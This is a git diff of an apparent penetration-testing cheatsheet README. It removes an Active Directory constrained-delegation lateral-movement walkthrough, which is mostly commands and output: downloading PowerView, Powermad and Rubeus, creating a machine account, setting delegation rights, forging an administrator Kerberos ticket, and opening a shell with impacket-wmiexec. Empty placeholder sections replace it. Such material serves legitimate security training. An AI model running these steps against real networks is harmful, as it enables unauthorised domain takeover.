@@ -136,184 +136,20 @@ Start with automated tools to search for low hanging fruits
 
 <br/>
 
-<details><summary> <b>ACTIVE-DIRECTORY</b> </summary>
-    <details><summary>Initial Access</summary>
-        content 1.1
-    </details>
-    <details><summary>Local Privilege Escalation</summary>
-        content 1.2
-    </details>
-  <details><summary>Post Exploitation</summary>
-        content 1.2
-    </details>
-    <details><summary>Lateral Movement</summary>
-        <details><summary>Constrained Delegation</summary>
-       
-          
-          
-          
-          # First off, download two PS scripts in local machine..
-            <br>
-          ```bash
-          wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
-          wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
-          ```
-           <br>
-          Then upload them to the target machine.
-             <br>
-          ```bash
-          # Evil-WinRM
-          upload PowerView.ps1
-          Import-Module .\PowerView.ps1
-          upload Powermad.ps1
-          Import-Module .\Powermad.ps1
-          ```
-
-          1. # **Check User's Permission and Windows Versions**
-               <br>
-              Check if users are allowed to create a new computer object on the domain.
-
-              ```bash
-              Get-DomainObject -Identity "dc=example,dc=com" -Domain example.com
-
-              # -------------------------
-              # Result
-              ms-ds-machineaccountquota: 10
-              ```
-               <br>
-
-              And check if the machine is at least Windows Server 2012.
-
-              ```bash
-              Get-DomainController
-
-              # -------------------------
-              # Result
-              OSVersion: Windows Server 2022 Standard
-              ```
-               <br>
-
-              Additionally, check if the target computer does not have the attributes **“msds-allowedtoactionbehalfofotheridentity”** set.
-
-              ```bash
-              hostname
-              Get-NetComputer <hostname> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
-
-              # ------------------
-              # Result
-              name msds-allowedtoactonbehalfofotheridentity
-              ---- ----------------------------------------
-              <HOSTNAME>   {1, 0, 4, 128...}
-              ```
-               <br>
-                
-              ```bash
-                .\Rubeus.exe s4u /user:HOST$ /rc4:rc4ORntml /msdsspn:CIFS/host.domain.com /impersonateuser:administrator /ptt
-                
-                dir \\host.domain.com\C$
-              ````  
-               <br>
-
-          2. **Create a New Computer**
-           <br>
-
-              Now you can create a new computer object.
-
-              ```bash
-              New-MachineAccount -MachineAccount TEST01 -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)
-              Get-DomainComputer test01
-
-              # ----------------------
-              # Result (copy the id)
-              objectsid: S-1-5-21-1677581083-3380853377-188903654-5103
-              ```
-               <br>
-
-              Create a new raw security descriptor.
-
-              ```bash
-              $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<objectid-of-a-new-computer>)"
-              $SDBytes = New-Object byte[] ($SD.BinaryLength)
-              $SD.GetBinaryForm($SDBytes, 0)
-              Get-DomainComputer <hostname> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
-              ```
-               <br>
-
-          3. **Impersonate to Get a Ticket**
-           <br>
-
-              Download Rubeus.exe in local machine.
-
-              ```bash
-              wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
-              ```
-               <br>
-
-              Then upload it to the target machine and generate a RC4 hash.
-
-              ```bash
-              # Evil-WinRM
-              upload Rubeus.exe
-              .\Rubeus.exe hash /password:12345 /user:test01 /domain:example.com
-
-              # -------------------------
-              # Result (copy the rc4 hash)
-              rc4_hmac: 32ED87BDB5FDC5E9CBA88547376818D4
-
-              ```
-               <br>
-
-              You can request a Kerberos ticket for a new machine account while impersonating an administrator.
-
-              ```bash
-              .\Rubeus.exe s4u /user:test01$ /rc4:<rc4-hash> /impersonateuser:administrator /msdsspn:cifs/<hostname>.example.com /ptt
-
-              # --------------
-              # Result (copy the output long hash at the last)
-              ```
-               <br>
-
-              Generate a ticket
-
-              ```bash
-              [IO.File]::WriteAllBytes("C:\Users\<username>\Documents\ticket.kirbi", [Convert]::FromBase64String("<new-output-hash>"))
-              download ticket.kirbi
-              ```
-               <br>
-
-          4. **Make the Ticket Usable and Use It**
-           <br>
-
-              Download “ticket_converter.py”.
-
-              ```bash
-              wget https://raw.githubusercontent.com/zer1t0/ticket_converter/master/ticket_converter.py
-              ```
-               <br>
-
-              Destroy any tickets in local machine, and convert the ticket to Linux usable, then set the new ticket’s path.
-
-              ```bash
-              kdestroy
-              python3 ticket_converter.py ticket.kirbi ticket.ccache
-              export KRB5CCNAME=ticket.ccache
-              ```
-               <br>
-
-              We can use the ticket to get a shell.
-
-              ```bash
-              impacket-wmiexec example.com/administrator@<hostname>.example.com -no-pass -k
-              ```
-                
-                
-      
-    </details>
-    </details>
-    <details><summary>Clearing Tracks</summary>
-        content 1.2
-    </details>
-</details>
+<details><summary> <b>ACTIVE DIRECTORY</b> </summary><blockquote>
+  <details><summary>INITIAL ACCESS</summary><blockquote>
+    :smile:
+  </blockquote></details>
+  <details><summary>LOCAL PRIVILEDGE ESCALATION</summary><blockquote>
+    :smile:
+  </blockquote></details>
+    <details><summary>LATERAL MOVEMENT ENUMERATION</summary><blockquote>
+    :smile:
+  </blockquote></details>
+   <details><summary>PERSISTENCE AND CLEARING TRACKS</summary><blockquote>
+    :smile:
+  </blockquote></details>
+</blockquote></details>
 
 <br/>
 
